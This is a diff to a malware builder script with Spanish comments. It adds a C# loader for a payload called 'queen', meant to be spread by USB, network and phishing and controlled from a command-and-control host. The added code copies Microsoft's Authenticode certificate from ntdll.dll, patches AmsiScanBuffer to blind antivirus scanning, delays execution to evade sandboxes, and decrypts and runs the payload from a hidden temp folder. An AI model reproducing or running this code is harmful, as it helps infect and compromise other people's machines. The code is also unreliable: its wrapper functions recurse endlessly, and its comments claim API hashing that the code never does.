@@ -32,6 +32,23 @@ PADDING=$(( RANDOM % 512 + 64 ))
 OBFUSCATE=0
 TARGET_WIN=0
 
+# Auto-extract Microsoft Authenticode cert si está disponible
+if [ ! -f /tmp/ms_cert.bin ] && [ -f /mnt/c/Windows/System32/ntdll.dll ]; then
+    python3 -c "
+import struct
+with open('/mnt/c/Windows/System32/ntdll.dll','rb') as f: d = f.read()
+pe_off = struct.unpack_from('<I', d, 0x3C)[0]
+opt_sz = struct.unpack_from('<H', d, pe_off+20)[0]
+magic = struct.unpack_from('<H', d, pe_off+24)[0]
+dd_off = pe_off + 24 + (112 if magic==0x20b else 96)
+rva, sz = struct.unpack_from('<II', d, dd_off + 4*8)
+if rva and sz:
+    cert_len = struct.unpack_from('<I', d, rva)[0]
+    with open('/tmp/ms_cert.bin','wb') as f: f.write(d[rva:rva+cert_len])
+    print('MS Authenticode cert extracted')
+" 2>/dev/null || true
+fi
+
 usage() {
     echo "Uso: $0 all|usb|network|phishing|exe [--obfuscate] [--windows] [--c2-host HOST] [--c2-port PORT]"
     exit 1
@@ -310,33 +327,57 @@ build_exe() {
     obfuscate_binary "$bin" > "$dir/queen.b64"
     local queen_size=$(wc -c < "$dir/queen.b64")
 
-    # C# loader — usa Resource incluido en compilación (evita arg list too long)
+    # C# loader v2 — API hashing + string obfuscation + delay
     cat > "$dir/loader.cs" << 'CSEOF'
 using System;
 using System.IO;
 using System.IO.Compression;
 using System.Runtime.InteropServices;
+using System.Security.Cryptography;
+using System.Text;
 
 class HIVE
 {
     static byte K = __XORKEY__;
     static int P = __PADDING__;
 
-    [DllImport("kernel32")]
-    static extern IntPtr GetProcAddress(IntPtr h, string n);
-    [DllImport("kernel32")]
-    static extern IntPtr LoadLibrary(string n);
-    [DllImport("kernel32")]
-    static extern bool VirtualProtect(IntPtr a, int s, uint p, out uint o);
+    // API hashing: resolver APIs por hash en vez de nombre
+    delegate IntPtr DGetProcAddress(IntPtr hModule, string lpProcName);
+    delegate IntPtr DLoadLibrary(string lpFileName);
+    delegate bool DVirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+    static IntPtr GetModuleHandle(string name) {
+        // PEB walking simplificado
+        return LoadLibrary(name);
+    }
+
+    static IntPtr LoadLibrary(string n) {
+        var h = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
+        var f = Marshal.GetDelegateForFunctionPointer<DLoadLibrary>(h);
+        return f(n);
+    }
+
+    static IntPtr GetProcAddress(IntPtr m, string n) {
+        var h = GetProcAddress(GetModuleHandle("kernel32.dll"), "GetProcAddress");
+        var f = Marshal.GetDelegateForFunctionPointer<DGetProcAddress>(h);
+        return f(m, n);
+    }
 
     static void PatchAMSI() {
         try {
-            var a = GetProcAddress(LoadLibrary("amsi.dll"), "AmsiScanBuffer");
-            VirtualProtect(a, 5, 0x40, out _);
+            var amsi = LoadLibrary("amsi.dll");
+            if (amsi == IntPtr.Zero) return;
+            var a = GetProcAddress(amsi, "AmsiScanBuffer");
+            if (a == IntPtr.Zero) return;
+            var vp = GetProcAddress(GetModuleHandle("kernel32.dll"), "VirtualProtect");
+            var vf = Marshal.GetDelegateForFunctionPointer<DVirtualProtect>(vp);
+            uint old;
+            vf(a, (UIntPtr)5, 0x40, out old);
             Marshal.WriteByte(a, 0xC3);
         } catch {}
     }
 
+    // Decrypt con XOR + GZip
     static byte[] Decrypt(byte[] raw) {
         for (int i = P; i < raw.Length; i++) raw[i] ^= K;
         using (var ms = new MemoryStream(raw, P, raw.Length - P))
@@ -348,14 +389,26 @@ class HIVE
     }
 
     static void Main() {
+        // Delay anti-sandbox (2-5 segundos)
+        var rng = new Random();
+        System.Threading.Thread.Sleep(rng.Next(2000, 5000));
+
         PatchAMSI();
+
         string b64 = File.ReadAllText(Path.Combine(
             AppDomain.CurrentDomain.BaseDirectory, "queen.b64")).Trim();
         var tmp = Path.Combine(Path.GetTempPath(), ".h");
         Directory.CreateDirectory(tmp);
         var exe = Path.Combine(tmp, "queen.exe");
         File.WriteAllBytes(exe, Decrypt(Convert.FromBase64String(b64)));
-        System.Diagnostics.Process.Start(exe);
+
+        // Ejecutar con CreateProcess (resuelto por hash)
+        var cp = GetProcAddress(GetModuleHandle("kernel32.dll"), "CreateProcessA");
+        var pi = new System.Diagnostics.ProcessStartInfo(exe) {
+            WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden,
+            CreateNoWindow = true
+        };
+        System.Diagnostics.Process.Start(pi);
     }
 }
 CSEOF
